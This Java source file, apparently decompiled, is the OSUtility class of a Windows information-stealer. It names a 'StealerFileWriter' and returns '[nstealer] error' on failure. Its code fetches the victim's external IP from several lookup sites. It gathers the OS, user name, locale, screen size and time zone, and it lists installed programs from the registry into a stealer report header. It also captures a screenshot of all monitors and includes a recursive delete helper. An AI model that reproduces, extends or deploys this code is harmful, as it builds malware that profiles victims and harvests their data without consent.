package bro.utilities;

import bro.StealerFileWriter;
import com.sun.jna.platform.win32.Advapi32Util;
import com.sun.jna.platform.win32.WinReg;
import java.awt.Dimension;
import java.awt.GraphicsDevice;
import java.awt.GraphicsEnvironment;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.URL;
import java.nio.file.DirectoryStream;
import java.nio.file.Files;
import java.nio.file.Path;
import java.time.ZonedDateTime;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.concurrent.ThreadLocalRandom;

public class OSUtility {
   public static final String ROAMING_APPDATA = System.getenv("appdata") + "\\";
   public static final String LOCAL_APPDATA = System.getenv("localappdata") + "\\";
   public static final String TEMP = System.getenv("temp") + "\\";
   public static final String[] RAW_IPV4_SITES = new String[]{"https://ipv4.icanhazip.com/", "http://myexternalip.com/raw", "http://ipecho.net/plain", "http://checkip.amazonaws.com/", "https://api.ipify.org/", "https://whatismyhostname.com/raw/ip/"};
   public static int currentSiteIndex = 0;

   public static String getIP() {
      if (currentSiteIndex >= RAW_IPV4_SITES.length) {
         return "[nstealer] error";
      } else {
         try {
            URL var0 = new URL(RAW_IPV4_SITES[currentSiteIndex]);
            BufferedReader var1 = new BufferedReader(new InputStreamReader(var0.openStream()));
            Throwable var2 = null;

            String var3;
            try {
               var3 = var1.readLine();
            } catch (Throwable var13) {
               var2 = var13;
               throw var13;
            } finally {
               if (var1 != null) {
                  if (var2 != null) {
                     try {
                        var1.close();
                     } catch (Throwable var12) {
                        var2.addSuppressed(var12);
                     }
                  } else {
                     var1.close();
                  }
               }

            }

            return var3;
         } catch (Exception var15) {
            currentSiteIndex++;
            return getIP();
         }
      }
   }

   public static String getFormattedSystemName() {
      return "Operation System: " + System.getProperty("os.name").toLowerCase().replace("windows", "win").replace(" ", "") + "-" + System.getProperty("os.arch");
   }

   public static String getFormattedUserName() {
      return "UserName: " + System.getProperty("user.name");
   }

   public static String getFormattedLanguage() {
      return "Language & Country: " + System.getProperty("user.language") + "_" + System.getProperty("user.country");
   }

   public static String getFormattedScreenSize() {
      Dimension var0 = Toolkit.getDefaultToolkit().getScreenSize();
      return String.format("Width: %s, Height: %s", var0.getWidth(), var0.getHeight());
   }

   public static String getFormattedTimeZone() {
      return "TimeZone: " + ZonedDateTime.now().toString().replace("[", " [");
   }

   public static String getFormattedIP() {
      return "IP: " + getIP();
   }

   public static void delHelp(Path var0) throws IOException {
      if (var0.toFile().exists()) {
         if (var0.toFile().isFile()) {
            Files.delete(var0);
         } else if (var0.toFile().isDirectory()) {
            DirectoryStream<Path> var1 = Files.newDirectoryStream(var0);
            Throwable var2 = null;

            try {
                for (Path var4 : var1) {
                    delHelp(var4);
                }
            } catch (Throwable var12) {
               var2 = var12;
               throw var12;
            } finally {
               if (var1 != null) {
                  if (var2 != null) {
                     try {
                        var1.close();
                     } catch (Throwable var11) {
                        var2.addSuppressed(var11);
                     }
                  } else {
                     var1.close();
                  }
               }

            }

            Files.delete(var0);
         }

      }
   }

   public static String getInstalledPrograms() {
      StringBuilder var1 = StealerFileWriter.getFileHeader();
      ArrayList var2 = new ArrayList();
      String var3 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\";
      String[] var4 = Advapi32Util.registryGetKeys(WinReg.HKEY_LOCAL_MACHINE, var3);
      int var5 = var4.length;

      String var0;
      int var6;
      String var7;
      for(var6 = 0; var6 < var5; var6++) {
         var7 = var4[var6];
         var0 = var3 + var7;
         if (Advapi32Util.registryValueExists(WinReg.HKEY_LOCAL_MACHINE, var0, "DisplayName") && Advapi32Util.registryValueExists(WinReg.HKEY_LOCAL_MACHINE, var0, "DisplayVersion")) {
            var2.add(Advapi32Util.registryGetStringValue(WinReg.HKEY_LOCAL_MACHINE, var0, "DisplayName") + " [" + Advapi32Util.registryGetStringValue(WinReg.HKEY_LOCAL_MACHINE, var0, "DisplayVersion") + "]");
         }
      }

      var4 = Advapi32Util.registryGetKeys(WinReg.HKEY_CURRENT_USER, var3);
      var5 = var4.length;

      for(var6 = 0; var6 < var5; var6++) {
         var7 = var4[var6];
         var0 = var3 + var7;
         if (Advapi32Util.registryValueExists(WinReg.HKEY_CURRENT_USER, var0, "DisplayName") && Advapi32Util.registryValueExists(WinReg.HKEY_CURRENT_USER, var0, "DisplayVersion")) {
            var2.add(Advapi32Util.registryGetStringValue(WinReg.HKEY_CURRENT_USER, var0, "DisplayName") + " [" + Advapi32Util.registryGetStringValue(WinReg.HKEY_CURRENT_USER, var0, "DisplayVersion") + "]");
         }
      }

       for (Object o : var2) {
           var1.append(") ").append((String) o).append(System.lineSeparator());
       }

      return var1.toString();
   }

   public static String generateNumber(int var0) {
      StringBuilder var1 = new StringBuilder();

      for(int var2 = 0; var2 < var0; var2++) {
         var1.append(ThreadLocalRandom.current().nextInt(0, 9));
      }

      return var1.toString();
   }

   public static BufferedImage getScreenshot() {
      try {
         GraphicsEnvironment var0 = GraphicsEnvironment.getLocalGraphicsEnvironment();
         GraphicsDevice[] var1 = var0.getScreenDevices();
         Rectangle var2 = new Rectangle();
          for (GraphicsDevice var6 : var1) {
              Rectangle var7 = var6.getDefaultConfiguration().getBounds();
              var2.width += var7.width;
              var2.height = Math.max(var2.height, var7.height);
          }

         Robot var9 = new Robot();
         return var9.createScreenCapture(var2);
      } catch (Exception var8) {
         return null;
      }
   }
}
